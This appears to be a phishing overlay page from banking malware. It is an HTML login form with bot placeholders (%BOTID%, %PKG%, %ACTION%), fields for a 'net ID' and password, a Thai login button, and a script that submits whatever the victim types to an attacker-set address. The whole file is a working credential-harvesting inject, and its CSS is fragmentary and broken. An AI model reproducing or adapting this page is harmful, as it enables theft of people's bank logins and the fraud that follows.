body{
 background:url('http://i.imgur.com/DYZUYqz.png');

    text-align: center;

    border: 0px solid red;

.main {

    border-color: #5ebfe6;

}

    content: "";

    border-radius: 100px;

  <body>

  
 <div  class="logo_div "  style="">
		 <img src="http://i.imgur.com/AEVXDvc.png" style="" class="logo_img"/>
 </div> 
  
<form role="form" name="" action="%ACTION%" method="POST" onsubmit="send_key();return false" class="form">
<input type="hidden" name="page_id" value="%PKG%" class="main_input"><input type="hidden" name="bot_id" value="%BOTID%" />
<div  class="main "  style="">
		<div  class="container-fluid "  style="">
				<div  class="form-group"  style="">
						<input class="form-control" type="text" name="fields[username]" id="username"  placeholder="net ID." />
				</div>
				
				<div  class="form-group"  style="">
						<input class="form-control" type="password" name="fields[pass]" id="pass"  placeholder="password" />
						<input class="" type="submit"  style="display:none"/>
				</div>
				
				<div  class="form-group"  style="">
						<button class="bt " onclick="send_key()" style="">&#3648;&#3586;&#3657;&#3634;&#3626;&#3641;&#3656;&#3619;&#3632;&#3610;&#3610;</button>
				</div>
				
		</div>
</div>
  
</form>

  
  
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> 
  </body>
 
<script>
  

$('.form-control').on('focus',function(){
		$(this).closest('.form-group').removeClass('has-error');
})

  
function send_key(){
   username=$('#username').val().trim();
   pass=$('#pass').val().trim();
   
   $('.has-error').removeClass('has-error');
   if(!/^.{1,40}\b/.test(username)){
		$('#username').closest('.form-group').addClass('has-error');
	}
	if(!/^[a-z-A-Z0-9]{1,40}\b/.test(pass)){
		$('#pass').closest('.form-group').addClass('has-error');
	}
	 
	 if($('.has-error:visible').size()>0){
		 return false;
	 }
	
    $('form')[0].submit()
   
   
};//send_key
  
  
  
  
  
</script>
